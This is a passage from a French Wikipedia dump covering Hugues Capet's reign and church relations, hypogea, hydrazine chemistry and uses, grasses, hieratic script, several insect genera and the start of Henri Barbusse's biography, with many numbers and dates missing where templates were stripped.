Désormais, il semblerait que l'autorité royale ne serve plus, à elle seule, à valider la décision qui est prise. En effet, les actes émanant de la chancellerie sont principalement des privilèges qui confirment les domaines des établissements religieux (par exemple Saint-Maur-des-Fossés, 988) et les placent sous la protection du roi () : les clercs estiment-ils inutile de demander la protection d'un souverain aussi faible ? Cette remarque est aujourd'hui discutée puisqu'on considère que ce changement administratif traduit moins un affaiblissement royal qu'un changement de méthode progressif à partir de Hugues Capet. Les derniers Carolingiens délivraient encore un nombre important de diplômes aux églises situées dans le Midi. Il s'agissait pour eux de mettre en place un sentiment de légitimité et de protection royale contre les musulmans proches, politique mise entre parenthèses depuis le milieu du .
Développement culturel et architectural.
On assiste à un nouvel essor culturel décrit par Helgaud de Fleury à partir de la fin du . Si l'Antiquité a toujours été présente dans la culture du haut Moyen Âge, le paysage monumental est en train de changer. On connaît aujourd'hui l'existence d'un art préroman clairement différencié de l'art carolingien.
On prête à Hugues Capet et à la famille royale un certain nombre de constructions : le souverain continue la construction du monastère Saint-Magloire entreprise par son père à Paris, tandis que la reine Adélaïde fait bâtir à Senlis une chapelle pour abriter les reliques de saint Frambourg et une autre à Argenteuil pour l'abbaye Notre-Dame. Hugues Capet agit en étroite collaboration avec le centre culturel de Saint-Benoît-sur-Loire. Les évêques jouent également un rôle primordial ; on travaille dans certaines cités à reconstruire ou à agrandir les sanctuaires : c'est le cas, à la fin du , de Beauvais et surtout de Reims. À cet égard, Richer de Reims nous décrit la reconstruction de la cathédrale de Reims par l'archevêque Adalbéron de Reims en 976. Plusieurs travaux sont effectués : on abat les cryptes occidentales et l'ouvrage voûté carolingien à l'entrée, on le remplace par un clocher-porche, puis on y place le corps de saint Calixte avant de faire élever un autel avec un oratoire. Enfin, l'autel principal est décoré d'une croix d'or et on fait percer de nouvelles fenêtres pourvues de vitraux historiés. En revanche, tous les contemporains ne partagent pas forcément cet engouement. En effet, pour le continuateur de Flodoard, qui poursuit la rédaction des annales depuis la mort de ce dernier, cette reconstruction est considérée comme un « sacrilège ».
Les centres urbains se développent également. À Tours, le quartier Saint-Martin, protégé par son "castrum" de pierre, engendre une agglomération dynamique avec de nombreuses boutiques. À Paris, à l'époque de Hugues Capet, la cité est tout entière occupée par le quartier épiscopal à l'est et le palais royal à l'ouest. Entre les deux, on note la présence d'un quartier dont les habitants fournissent le roi et l'évêque en produits précieux. Sur les deux rives s'élèvent des bourgs monastiques autour desquels s'étendent des vignes, des ateliers et des ports fluviaux (Saint-Germain-des-Prés). Ailleurs, à Châteaudun, la collégiale Notre-Dame apparaît en 1003 dans l'enceinte du "castrum" édifié par le comte de Blois, mais cela reste un cas isolé puisque les châteaux privés restent rares. À la fin du , le timide éveil économique permet de poursuivre la composition urbaine des cités (caractérisée par une structure polynucléaire) : cité épiscopale, "castrum" et "suburbium" hérités du haut Moyen Âge.
Hugues Capet et l'Église.
Hugues Capet, lui-même abbé, comprend vite tout l'intérêt qu'il peut tirer de la réforme clunisienne. Il entretient des liens d'amitié avec Maïeul de Cluny, fait montre de dévotion aux cérémonies religieuses et de soutien à la réforme monastique. Il octroie, en 994 à l'abbé Heldric de Saint-Germain d'Auxerre, l'élection de l'abbé par les seuls moines, et non plus par l'évêque d'Auxerre. Il est logiquement soutenu pour son élection par les réformateurs de l'Église et, en particulier, par Gerbert d'Aurillac et Adalbéron de Reims, personnalités influentes et proches des Ottoniens, ce d'autant que les Carolingiens se sont montrés menaçants pour et .
Mais, une fois au pouvoir, il doit, aux yeux des Ottoniens, rester suffisamment faible pour que la Francie ne puisse s'ériger en contre-pouvoir. Par exemple, Adalbéron rechigne à sacrer son fils Robert, pourtant formé par son écolâtre Gerbert. Il faut toute l'habileté politique de Hugues Capet pour le convaincre. Ce dernier délègue ensuite à Robert le Pieux de réelles responsabilités religieuses et militaires qui l'imposent de fait comme son successeur. La réforme monastique ne pouvant pas emporter l'adhésion de tous les abbés et évêques laïcs, des divisions existent au sein de l'Église. Odilon de Cluny et le mouvement de la Paix de Dieu sont fortement critiqués par des personnalités ecclésiastiques de premier ordre, surtout au nord de la Loire, comme Adalbéron de Laon ou Gérard de Cambrai. Les Ottoniens contrôlent le Saint-Siège et manœuvrent pour que, en Francie, le pouvoir reste partagé entre Carolingiens et Robertiens.
La trahison de l'archevêque Arnoul a porté un rude coup au crédit du roi. Cependant, ce dernier manœuvre avec habileté, utilisant la voie conciliaire pour contrer les décisions du Saint-Siège (qui est assujetti à l'empereur). De plus, en contraste avec le peu de moyens dont il dispose, la légitimité du roi s'affermit grâce au soutien de grands ecclésiastiques : ils voient bien que le roi, bien que faible, incarne la tradition d'une autorité supérieure, seule capable de maintenir l'ordre et la paix dans la société chrétienne. Les évêques aquitains et languedociens élaborent sans doute, faute de mieux, la Paix de Dieu au moment même où Hugues Capet commence à régner, mais leurs confrères du Nord, plus proches de la royauté, cherchent à lui apporter un soutien idéologique (Gérard de Cambrai, Adalbéron de Laon).
À cet égard, Abbon de Fleury, qui avait vigoureusement défendu Arnoul au concile de Verzy, écrit que, à partir du règne de Hugues Capet, la théorie de la royauté, forgée par Hincmar de Reims, est reprise : le roi règne en s'appuyant sur les conseils des ecclésiastiques. Lui et ses contemporains, pour des raisons obscures et paradoxales, assignent à partir de ce moment un grand intérêt à la royauté. Abbon rappelle qu'il faut être fidèle au roi et que chacun des grands seigneurs ne se trouve finalement être qu'un dépositaire du service dû au roi. Oubliée sous les derniers carolingiens, l'image du « roi idéal » fait son apparition : , ajoute Abbon. Il semble que, sur ce point, Hugues, pour redorer son blason aux yeux des évêques (en construisant des bâtiments religieux par exemple), ait dû légitimer ses actions contre les Carolingiens :
Abbon entend sauvegarder pour l'avenir la mémoire capétienne, qui reste encore fragile dans les mentalités du . Contrairement aux derniers Carolingiens, les premiers capétiens s'attachent un clan d'évêques au nord-est de Paris (Amiens, Laon, Soissons, Châlons…), dont le soutien se montrera déterminant dans la suite des événements. Hugues Capet et Robert le Pieux ont besoin de l'appui de l'Église pour asseoir davantage leur légitimité, entre autres parce que les évêchés fournissent de gros contingents pour l'armée royale. Dans un de leurs diplômes, les deux rois apparaissent comme les intermédiaires entre les clercs et le peuple ("mediatores et plebis"). Et les deux rois eux-mêmes, sous la plume de Gerbert d'Aurillac, insistent sur cette nécessité de "consilium" : . Ce soutien de l'Église à la nouvelle dynastie se traduit au début du par la prophétie de saint Valery : deux auteurs originaires des monastères de Saint-Valery et de Saint-Riquier, dans le Nord, affirmèrent que saint Valery apparut à Hugues Capet pour lui promettre que ses successeurs régneraient sur le royaume des Francs . Cette prophétie de saint Valery était une réponse à l'affirmation formulée à Sens au début du d'après laquelle les Capétiens étaient des usurpateurs.
Finalement, malgré un pouvoir réel relativement faible et en dépit de la puissance des Ottoniens, Hugues Capet parvient à jouer des divisions au sein de la grande aristocratie et de l'Église pour obtenir suffisamment de soutiens à la transmission héréditaire de sa couronne. En même temps, la restauration du pouvoir royal s'inscrit dans un mouvement plus large : la Paix de Dieu est en train de fonder progressivement une société à trois ordres, dans laquelle le clergé, qui est dépositaire de la culture, se rend indispensable à l'exercice du pouvoir.
Paradoxalement, l'évolution se fait au alors que le soutien clérical apparaît de moins en moins indispensable (en particulier à partir du règne de son petit-fils ) et que s'affirme l'influence des puissants laïcs.
Prix Hugues-Capet.
Le prix Hugues-Capet vise à récompenser depuis 1994 un ouvrage écrit sur « un roi de France, une reine de France, un prince capétien, l'un de leurs aïeux, de leurs conjoints, de leurs descendants, ou sur l'un des grands serviteurs du royaume ».
Le jury a été présidé, de 1994 jusqu’à son décès en 2003, par Isabelle d'Orléans et Bragance (1911-2003), comtesse de Paris. La princesse Béatrice de Bourbon-Siciles lui a depuis succédé.

</doc>
<doc id="1450" url="https://fr.wikipedia.org/wiki?curid=1450" title="Hypogée">
Hypogée

Un hypogée désigne en archéologie une construction creusée dans le sol ou dans le flanc d'une colline destinée le plus souvent à contenir une ou plusieurs tombes. Le terme est généralement utilisé pour les tombes de ce type datées de la Préhistoire, de la Protohistoire et de l'Antiquité, pour la période médiévale et moderne on privilégie celui de caveau.
Définition.
Le mot provient du bas latin "hypogeum" lui-même issu du grec "hupogeion," signifiant « souterrain » (du grec "hupo", « sous », et "gê", « terre »). Vitruve nomme "hypogeum" la partie d'un bâtiment qui est au-dessous du niveau du sol (De architectura, VI,8) et le mot désigne dans l'Antiquité, toute construction souterraine et en particulier un tombeau souterrain. À l'origine, le mot désigne indifféremment tout bâtiment placé au-dessous du niveau du sol, et, par extension, un caveau funéraire. Dans la Rome antique, le caveau souterrain est appelé "conditorium" ("descendit in conditorium", Pétrone, Satyricon, 111,7) où l'on dépose le cadavre dans une case sans le réduire en cendres (Pline,Histoire naturelle, VII, 16).
En archéologie, le mot est utilisé pour désigner toutes les constructions de ce type réalisées par diverses civilisations antiques s'étant développées durant l'Antiquité le long du littoral de la Méditerranée (Grèce, Italie, Égypte, Syrie), et également celles, à vocation funéraire, réalisées par certaines cultures préhistoriques (Malte, Sardaigne, Minorque, France).
Pour l’architecture médiévale et moderne, on privilégie celui de "caveau" qui est cependant plus restrictif puisqu'il ne concerne que des constructions à vocation funéraire.
Exemples d'hypogées.
Dans l'Égypte antique, l'hypogée désigne une tombe souterraine (comme celles de la vallée des Rois), par opposition à une tombe aérienne appelée mastaba.
L'hypogée de Ħal Saflieni constitue le complexe funéraire le plus spectaculaire de l'archipel de Malte.
En Italie, on désigne sous le nom d'hypogées aussi bien des tombes antiques de la civilisation étrusque enfouies sous des tumuli que les « domus de janas » sardes creusées dans la roche à la fin du Néolithique.
Sur l'île de Minorque, des hypogées ont été creusés dès le Néolithique (Biniai Nou) et jusqu'à l'Âge du bronze (Torre del Ram).
En France, il existe aussi des hypogées néolithiques notamment dans les Bouches-du-Rhône (Fontvieille), dans l'Essonne (Champtier des Bureaux, Fontaine Saint-Léger) et surtout dans la Marne (Villevenard, Coizard-Joches). Dans ce département, près de creusés dans la craie ont été recensés dans les marais de Saint-Gond.
Par abus de langage, certains monuments sont parfois qualifiés d'hypogée alors même qu'ils ne répondent pas à la définition, comme l'hypogée des Dunes à Poitiers qui est un cimetière mérovingien, datant du .

</doc>
<doc id="1451" url="https://fr.wikipedia.org/wiki?curid=1451" title="Hydrazine">
Hydrazine

L’hydrazine, de nom officiel diazane, de formule chimique N2H4 et de formule semi-développée H2N-NH2, est un composé chimique liquide incolore, avec une odeur rappelant celle de l’ammoniac. Elle est miscible à l'eau en toutes proportions. 
Les hydrazines constituent également une famille de composés chimiques dérivés de l'hydrazine (H2N-NH2 par substitution d'un ou plus atomes H par des radicaux hydrocarbonés (par exemple la 2,4-dinitrophénylhydrazine).
La production annuelle de l'hydrazine est de La plus grande part de cette production est utilisée comme agent moussant pour la production de polymères expansés. Le reste de cette production se répartit dans différents secteurs comme la chimie organique pour la synthèse de médicaments ou la chimie inorganique pour la production d'azoture de sodium, l'agent explosif de gonflage des « "airbags" » (coussins gonflables de sécurité). L'hydrazine est également utilisable comme carburant des moteurs de fusée.
Structure moléculaire et propriétés.
La structure de l'hydrazine se présente sous l’aspect de deux molécules d’ammoniac accouplées l’une à l’autre par enlèvement d'un hydrogène pour chacune des deux molécules. Chaque sous-unité -NH2 se présente sous une forme pyramidale. La distance entre les deux atomes d'azote est de et la molécule adopte une conformation anticlinale. Le moment de rotation est le double de celui de l’éthane. Ses propriétés structurelles ressemblent à celles du peroxyde d'hydrogène gazeux, qui adopte une conformation « asymétrique » analogue à une structure d'alcane linéaire, avec un moment de rotation élevé.
Elle possède les propriétés d’une base comparable à l’ammoniaque, mais 15 fois plus faible.
Le substituant sur chaque amine rend le doublet électronique moins disponible pour capter un proton et donc moins basique. L'hydrazine est un meilleur nucléophile que l'ammoniac à cause de la répulsion entre les doublets non liants des atomes d'azote adjacents.
La deuxième protonation est plus difficile:
L'hydrazine est un réducteur beaucoup plus fort en milieu basique qu'en milieu acide. (E=- à pH=0 et E=- à pH=14). Lorsque l'hydrazine réagit avec des oxydants, divers produits azotés peuvent se former mais en général, il s'agit de diazote. La réaction de l'hydrazine avec le dioxygène forme du diazote et de l'eau, tout en dégageant une grande quantité de chaleur.
L'hydrazine se dégrade sous l'action de la chaleur et des rayons ultraviolets en azote , hydrogène et ammoniac .
Certains sels d'hydrazine sont explosifs : nitrate d'hydrazine, chlorate d'hydrazine, perchlorate d'hydrazine et azoture d'hydrazonium.
Propriétés physico-chimiques.
L'hydrazine anhydre est un liquide incolore fumant à l'air avec une odeur aminée. Le seuil olfactif est de .
Synthèse.
Theodor Curtius synthétisa l’hydrazine simple pour la première fois en 1889 par un biais détourné.
L’hydrazine est produite par le procédé d’Olin Raschig à partir de l’hypochlorite de sodium et de l'ammoniac, une méthode inventée en 1907. Ce procédé repose sur la réaction des chloramines avec l'ammoniac.
Une variante du procédé d’Olin Raschig est l'oxydation de l’urée par l’hypochlorite de sodium :
Dans le cycle Atofina-PCUK, l'hydrazine est fabriquée en plusieurs étapes à partir d’acétone, d'ammoniaque et de peroxyde d'hydrogène. L’acétone et l'ammoniaque réagissent d’abord pour donner une imine, réaction suivie d’une oxydation par le peroxyde d'hydrogène en oxaziridine, un hétérocycle à trois atomes comportant un atome de carbone, un atome d'azote et un atome d'oxygène, suivie d’une ammoniolyse qui conduit à l’hydrazone, un processus qui assemble deux atomes d'azote. L’hydrazone réagit avec l'acétone en excédent, et l'acétone azine produite est hydrolysée pour former l'hydrazine, en régénérant l’acétone. Contrairement au procédé de Raschig, cette méthode ne génère pas de sel. PCUK est associé à Ugine Kuhlmann, un fabricant français de produits chimiques.
L’hydrazine peut aussi être produite par une méthode connue sous le nom de procédé kétazine et peroxyde.
En 2001, Marc Strous, microbiologiste à l'université de Nimègue aux Pays-Bas, a découvert que l'hydrazine est produite par des levures et une bactérie océanique, "Brocadia anammoxidans", par une réaction d’anammox réalisée dans des organites spécialisés appelés anammoxosomes. Ce sont les seuls organismes vivants actuellement connus capables de produire naturellement de l’hydrazine.
Dérivés.
On connaît de nombreux dérivés par substitution de l’hydrazine, et plusieurs d’entre eux sont produits naturellement. Quelques exemples :
Utilisation en chimie.
Les hydrazines sont utilisées dans la synthèse de nombreuses molécules organiques et beaucoup d’entre elles ont une importance pratique dans l’industrie pharmaceutique, comme antituberculeux, ainsi que dans les textiles comme colorant et dans la photographie.
On la trouve aussi dans l'industrie en général et plus particulièrement mélangée à l'eau alimentaire pour chaudière vapeur. Elle a pour but de détruire les dernières molécules d'oxygène et ainsi éviter la corrosion des lignes de vapeur en acier.
Réaction avec les carbonyles.
Pour illustrer la condensation de l'hydrazine avec un radical carbonyle, citons la réaction avec l’acétone qui conduit à la formation de diisopropylidène hydrazine. Celle-ci réagit encore avec l'hydrazine pour former une hydrazone :
L'acétone et la diisopropylidène hydrazine sont des intermédiaires dans la synthèse PCUK-Atofina. L’alkylation directe des hydrazines avec les halogénoalcanes en présence d’une base forme des dérivés alkylés des hydrazines, mais la réaction est généralement inefficace en raison d’un mauvais contrôle sur le niveau de substitution (comme pour les Amines ordinaires). La réduction de l’hydrazone en hydrazine constitue une façon élégante de produire des hydrazines 1,1 dialkylées.
Dans une autre réaction, la 2-cyanopyridine réagit avec l'hydrazine pour former des hydrazides amidées qui peuvent être converties en triazines en utilisant les 1,2-dicétones.
Réaction de Wolff-Kishner.
L’hydrazine est utilisée en chimie organique dans la réduction de Wolff-Kishner, une réaction qui transforme le groupe carbonyle d'une cétone ou d’un aldéhyde en pont méthylène (ou groupe méthyle) par l'intermédiaire d'une molécule d’hydrazone. La production de diazote très stable à partir de l'hydrazine favorise la réaction.
Synthèse des molécules polycycliques.
Ayant deux fonctions amines, l’hydrazine est une pièce maîtresse pour la préparation de nombreux composés hétérocycliques via la condensation avec une partie possédant deux fonctions électrophiles. Avec l’acétylacétone, il se condense pour donner le 3,5-diméthylpyrazole. Dans la réaction d’Einhorn-Brunner, les hydrazines réagissent avec les imides pour donner des triazoles.
Sulfonation.
Étant un bon nucléophile, N2H4 est vulnérable à l'attaque des halogénures de sulfonyle et des halogénures d'acyle. Le tosyl hydrazine forme aussi des hydrazones après traitement avec des carbonyles.
Découpage des phtalimides.
L’hydrazine est utilisée pour découper la "N"-phtalimide en dérivés alkylés. Cette réaction de scission permet à l’anion phtalimide d'être utilisé comme précurseur d'amine dans la synthèse de Gabriel.
Agent réducteur.
L’hydrazine est un réducteur apprécié parce que ses sous-produits de décomposition sont généralement l'azote gazeux et l'eau. Ainsi, elle est utilisée comme antioxydant, désactiveur d’oxygène et inhibiteur de corrosion dans l'eau des chaudières et des circuits de chauffage (dans ce rôle, on lui préfère désormais la N,N-diéthylhydroxylamine, de moindre toxicité, mais elle est encore abondamment utilisées contre la corrosion dans les grandes centrales thermiques et nucléaires notamment). Elle est aussi utilisée pour réduire les sels de métaux et d'oxydes de métaux à l’état métallique dans l’électrolyse du nickel ainsi que dans l’extraction du plutonium à partir de combustibles nucléaires usés.
Sels d’hydrazine.
L’hydrazine est convertie en sels solides au moyen d’un traitement par les acides minéraux. Le sel le plus répandu est l'hydrogénosulfate d'hydrazine, N2H5HSO4, qui devrait probablement être appelé bisulfate d’hydrazine. Le bisulfate d’hydrazine est utilisé comme traitement alternatif de la cachexie induite par le cancer. Le sel de l'hydrazine et de l’acide azothydrique N5H5 avait un intérêt scientifique, en raison de sa forte teneur en azote et de ses propriétés explosives.
La réaction de l'hydrazine avec l'acide nitrique est extrêmement violente, elle est d'ailleurs utilisée comme base dans les moteurs-fusée à ergols liquides et produit le nitrate d'hydrazine.
Utilisations industrielles.
L’hydrazine est utilisée dans de nombreux procédés, par exemple la production de fibres d’élasthanne, comme catalyseur de polymérisation, agent gonflant, pour les piles à combustibles, comme flux de brasage pour le soudage, comme stabilisant dans certains procédés couleur argentiques, comme prolongateur de chaîne pour la polymérisation du polyuréthane, comme composé réducteur pour le conditionnement de l'eau des centrales thermiques et des circuits secondaires des centrales nucléaires et comme stabilisateur de chaleur. En outre, une technique utilisant des dépôts d'hydrazine sur les semi-conducteurs a été expérimentée, avec une possible application à la fabrication des thin-film transistors utilisés pour les écrans à cristaux liquides. L’hydrazine en solution à 70 % avec 30 % d'eau est utilisée pour alimenter l'EPU (unité d'alimentation d'urgence), sur les avions de chasse F-16 (General Dynamics F-16 Fighting Falcon).
En usage militaire, un dérivé de l'hydrazine, la diméthylhydrazine asymétrique (UDMH), combiné avec du nitrate d'ammonium est l'ingrédient de base de l’, un explosif extrêmement puissant inventé dans les années 1960.
Carburant pour fusées.
L’hydrazine fut d'abord utilisée comme carburant pour fusées lors de la Seconde Guerre mondiale pour les avions Messerschmitt Me 163 (le premier avion-fusée), sous le nom de "B-Stoff" (en fait, de l'hydrate d'hydrazine). Ce "B-Stoff" était mélangé à du méthanol ("M-Stoff") pour donner du "C-Stoff", lequel était utilisé comme carburant avec du "T-Stoff", un concentré de peroxyde d'hydrogène, utilisé comme comburant au contact duquel il s'enflammait spontanément en une réaction très énergétique.
Aujourd'hui, l'hydrazine est utilisée généralement seule comme monergol dans les moteurs à faible poussée (mais grande précision) permettant le positionnement sur orbite des satellites et des sondes spatiales ; dans ce cas, la poussée est assurée par décomposition catalytique de l'hydrazine et non par combustion. Cette décomposition est en effet une réaction très exothermique. Elle est obtenue en faisant passer l'hydrazine sur un catalyseur dont le composant actif est l'iridium métallique déposé sur une grande surface d’alumine (oxyde d'aluminium), ou de nanofibres de carbone, ou le nitrure de molybdène sur l'alumine, voire du nitrate de molybdène. Sa décomposition en ammoniac, diazote et dihydrogène résulte des réactions suivantes :
Cette décomposition se déclenche en quelques millisecondes et permet de doser la poussée de façon très précise. Ces réactions sont très exothermiques (le catalyseur de la chambre peut atteindre en quelques millisecondes), et produisent un gros volume de gaz chauds à partir d’un faible volume d’hydrazine liquide, ce qui en fait un bon propergol pour la propulsion spatiale.
Certains dérivés de l'hydrazine sont également employés comme ergols liquides : la monométhylhydrazine (ou MMH), et la diméthylhydrazine asymétrique, (ou UDMH). Ils sont généralement utilisés avec le peroxyde d'azote comme oxydant, avec lequel ils forment un propergol liquide stockable hypergolique.
Piles à combustible.
Le fabricant italien de catalyseur Acta a proposé d'utiliser l’hydrazine comme solution alternative à l'hydrogène dans les piles à combustibles. Le principal avantage de ce produit est sa capacité à produire plus de 200 mW/cm, davantage qu’une pile à hydrogène similaire sans nécessité de recourir à de coûteux catalyseurs contenant du platine. Comme le combustible est liquide à température ambiante, il peut être manipulé et stocké plus facilement que l'hydrogène. En stockant l'hydrazine dans un réservoir contenant un carbonyle avec une double liaison carbone oxygène, le combustible réagit et forme une matière solide et sûre appelé hydrazone. Ensuite il suffit de remplir le réservoir avec de l'eau chaude pour libérer l’hydrate d'hydrazine sous forme liquide. La manipulation d’un combustible liquide est en pratique beaucoup plus sûre que de celle de l'hydrogène gazeux, et le liquide a un plus grand potentiel d'oxydo-réduction () comparativement à pour l'hydrogène. La molécule d’hydrazine est cassée dans la pile pour former du diazote et des atomes d'hydrogène qui se lient à un atome d’oxygène pour former de l’eau.
Sécurité.
Toxicité, écotoxicité.
L'hydrazine est hautement toxique et dangereusement instable, surtout sous sa forme anhydre. On l'utilise généralement sous forme de monohydrate stable. Les symptômes d'une exposition aiguë à des niveaux élevés d'hydrazine peuvent se manifester chez l'homme par l'irritation des yeux, du nez et de la gorge, des étourdissements, des céphalées, des nausées, un œdème pulmonaire, des convulsions, un coma. Une exposition aiguë peut également endommager le foie, les reins et le système nerveux central chez l'homme. Le liquide est corrosif et peut produire un eczéma de contact chez les humains et les animaux. Des effets nocifs pour les poumons, le foie, la rate et la thyroïde ont été rapportés chez des animaux exposés de façon chronique à l'hydrazine par inhalation. Une augmentation du nombre de cas de tumeur du poumon, de la cavité nasale, et du foie a été observée chez les rongeurs exposés à l'hydrazine.
Sa toxicité fait l'objet de réévaluations périodiques, avec l'évolution des connaissances.
Un dérivé de l’hydrazine a également été mis en cause dans une étude scientifique reliant la consommation d’un champignon contenant cette toxine, "Gyromitra esculenta", à un cluster de cas de SLA (anciennement appelée maladie de Charcot).

</doc>
<doc id="1452" url="https://fr.wikipedia.org/wiki?curid=1452" title="Herbe">
Herbe

Le terme « herbe » désigne dans une acception large toute plante annuelle ou vivace, non ligneuse, faisant partie des Angiospermes (monocotylédones ou dicotylédones), de couleur généralement verte.
Dans une acception plus étroite, « herbe » désigne couramment les graminées, notamment les graminées fourragères, qui constituent les herbages, les prairies et les pelouses, et les familles voisines par leur morphologie, joncacées (les joncs) et cypéracées (les carex).
Utilisation.
Les herbes possèdent une variété d'utilisations telles que culinaires, médicinales (phytothérapie) ou, même dans certains cas, spirituelles. L'utilisation générale diffère entre herbes culinaires et herbes médicinales. Pour les usages médicinaux et spirituels, certaines parties des plantes pourraient être considérées comme de l'« herbe », comme les feuilles, les fleurs, les graines, les racines, la résine, les baies et parfois le péricarpe ou autres portions de plantes.
Plus spécifiquement, « herbe » peut désigner certaines catégories de plantes utiles (fines herbes, herbes aromatiques en général, herbes médicinales ou officinales), ou nuisibles (mauvaise herbe), mais aussi dans un usage argotique les fleurs de cannabis que l'on sèche pour être fumées dans un but récréatif.
Herbes culinaires.
L'utilisation culinaire des herbes ou fines herbes, concerne les parties vertes feuillues de menues plantes, notamment le persil, la ciboulette, le cerfeuil et l'estragon dans la tradition gastronomique française à la différence des épices, autres parties de plantes, incluant graines, baies, racines et fruits. Elles font partie des herbes aromatiques d'usage plus général.
Herbes médicinales.
Les plantes contiennent des composés phytochimiques faisant effet sur le corps humain.
Ces composés peuvent avoir des effets bénéfiques, lorsqu'ils sont consommés en petites quantités, ou avoir des effets néfastes lorsqu'ils sont consommés en grande quantité. Certains types de plantes, comme le millepertuis perforé ("Hypericum perforatum") ou le kava ("Piper methysticum") peuvent être utilisés à des fins médicinales pour lutter contre la dépression ou le stress. Cependant, un grand nombre de ces herbes peuvent mener à des infections toxiques pouvant impliquer des complications, parfois sérieuses, et doivent être utilisées avec précaution. Une substance, nommée Shilajit, peut aider à lutter contre le diabète. Les herbes ont été la base de l'herbologie chinoise depuis des siècles.
Linguistique.
Le terme d'« herbe » apparaît dans un grand nombre de mots composés ou de syntagmes figés désignant des plantes : le tabac a ainsi été appelé historiquement « herbe de la reine » ou « herbe de l'ambassadeur ».
Utilisé absolument, le terme désigne également le cannabis (chanvre ou marijuana). « Herbe » se dit d'ailleurs "hachich" en arabe, ce qui a donné dans la langue française le mot haschich.
Botanique.
L'herbe n'a pas de définition botanique précise, bien que certaines classifications, depuis Théophraste opposent les herbes aux végétaux ligneux (arbres et arbustes).
« Herbe » s'oppose facilement à « arbre » selon deux critères :
Dans la classification de Raunkier (classification des types biologiques), les herbes correspondent essentiellement :
Formations végétales.
L'herbe, essentiellement les graminées, est à la base de formations végétales caractéristiques qui occupent d'importantes surfaces de la planète. Celles-ci incluent les herbes hautes (savane des régions tropicales et subtropicales), les herbes basses (prairies naturelles comme la steppe eurasienne et son équivalent en Amérique du Nord, la Grande Prairie, mais aussi la pampa d'Argentine, le veld d'Afrique du Sud ; steppe à alfa d'Afrique du Nord ; lande basse à bruyère de l'Ouest atlantique européen ; prairies permanentes et artificielles des zones tempérées et champs de céréales cultivées) ainsi qu'herbes rases (toundra des zones sub-arctiques) ; pelouse des montagnes (notamment Massif-Central, Alpes) et gazon des pelouses urbaines.

</doc>
<doc id="1453" url="https://fr.wikipedia.org/wiki?curid=1453" title="Hashish">
Hashish



</doc>
<doc id="1454" url="https://fr.wikipedia.org/wiki?curid=1454" title="Hashisch">
Hashisch



</doc>
<doc id="1455" url="https://fr.wikipedia.org/wiki?curid=1455" title="Écriture hiératique">
Écriture hiératique

Dans l'Égypte antique, l'écriture hiératique permettait aux scribes d'écrire rapidement en simplifiant les hiéroglyphes et était utilisée dans l'administration. Le mot "hiératique" vient du grec ("grammata hieratika" ; littéralement « écriture sacerdotale »), et fut utilisé la première fois par Clément d'Alexandrie au .
L'écriture hiératique est le deuxième niveau de simplification des hiéroglyphes. Le premier étant les hiéroglyphes linéaires, qui sont des versions simplifiées des hiéroglyphes, mais qui gardent leur valeur représentative. Les caractères hiératiques, eux, ne représentent plus des objets, mais uniquement des signes immotivés à la manière des lettres d'un alphabet.
Les paléographes classent l'écriture hiératique comme une tachygraphie, utilisée dans l'administration (correspondances, remboursements de dettes, notes de blanchisserie, bordereaux de livraison) mais aussi dans le domaine culturel (textes littéraires ou scientifiques).
Cette écriture simplifiée a été utilisée tout au long de la civilisation égyptienne, depuis l'époque prédynastique (au moins avant notre ère), jusqu'au après celle-ci, soit pendant presque trente-cinq siècles. Son importance se restreint avec le développement de l'écriture démotique.
Nouvelle simplification de l'écriture hiératique, le démotique devient historiquement discernable vers le milieu du avant notre ère. Il remplace pour une bonne part l'usage du hiératique, sans totalement le faire disparaître.

</doc>
<doc id="1456" url="https://fr.wikipedia.org/wiki?curid=1456" title="Harpalus (genre)">
Harpalus (genre)

"" est un genre d'Insectes coléoptères prédateurs de la famille des Carabidae, de la sous-famille des Harpalinae dont les adultes ont pour proies principalement les pucerons, les diptères et les larves de coléoptères sur les grandes cultures et les cultures légumières.
Espèces fossiles.
Selon "Paleobiology Database" en 2025, il y a aussi et trois vivantes :
Taxonomie.
Le nom valide complet (avec auteur) de ce taxon est "Harpalus" Latreille, 1802.
Synonymie.
"Harpalus" a pour synonymes :
Sous-genres.
Les sous-genres sont au nombre de cinq :

</doc>
<doc id="1457" url="https://fr.wikipedia.org/wiki?curid=1457" title="Heterotoma">
Heterotoma

"" est un genre d'insectes hétéroptères (punaises), des prédateurs de la famille des Miridae, dont les larves et les adultes ont pour proies principalement les acariens, les psylles, les pucerons et les thrips sur les arbres fruitiers, la vigne, et les cultures légumières.

</doc>
<doc id="1458" url="https://fr.wikipedia.org/wiki?curid=1458" title="Hemerobius">
Hemerobius

Le genre "" regroupe des insectes névroptères prédateurs de la famille des hémérobiidés, dont les larves et les adultes ont pour proies principalement les acariens, les cochenilles, les psylles, les pucerons, les thrips, les œufs de lépidoptères et d'aleurodes sur les arbres fruitiers, la vigne et les grandes cultures.
Liens externes.
 

</doc>
<doc id="1460" url="https://fr.wikipedia.org/wiki?curid=1460" title="Henri Barbusse">
Henri Barbusse

Henri Barbusse est un écrivain, homme politique, scénariste et journaliste français, né le à Asnières et mort le à Moscou.
Il relate sa vie au front pendant la Première Guerre mondiale dans son roman "Le Feu" qui remporte le prix Goncourt en 1916. Résolument pacifiste, il fonde l’Association républicaine des anciens combattants en 1917 et adhère au Parti communiste en 1923.
Se consacrant à son activité de journaliste, il devient directeur littéraire de "l'Humanité" en 1926. Il fonde la revue "Monde" en 1928.
Biographie.
De son côté paternel, Adrien Gustave Henri Barbusse est issu d'une famille protestante d'origine cévenole dans un hameau d'Anduze, près d'Alès. Son père, licencié de théologie de l'université de Genève, est journaliste, chroniqueur théâtral au "Siècle". Sa mère, d'origine anglaise, meurt alors que le jeune Henri n'a que .
Le milieu littéraire le reconnaît très tôt comme l'un des siens, à la suite de sa participation remarquée, en 1892, au concours de poésie de "L'Écho de Paris" de Catulle Mendès. Son premier recueil de poèmes, "Pleureuses", est publié en .
Il s'exerce alors professionnellement dans la presse, se tourne vers la prose et publie un premier roman, empreint de décadence et de naturalisme à la fois : "L'Enfer", en . Cette même année, il intègre les "Poètes d'aujourd'hui", d'Adolphe van Bever et Paul Léautaud.
L'expérience de la guerre.
En 1914, alors âgé de 41 ans, malgré des problèmes pulmonaires et ses positions pacifistes d'avant-guerre, il s'engage volontairement dans l'infanterie et réussit à rejoindre les troupes combattantes en au régiment d'infanterie avec lequel il participe aux combats en première ligne jusqu'en 1916. Il est souvent malade mais retourne au front à chaque fois pour quelques mois. Le , il est décoré de la croix de guerre avec citation. Il est finalement réformé le .
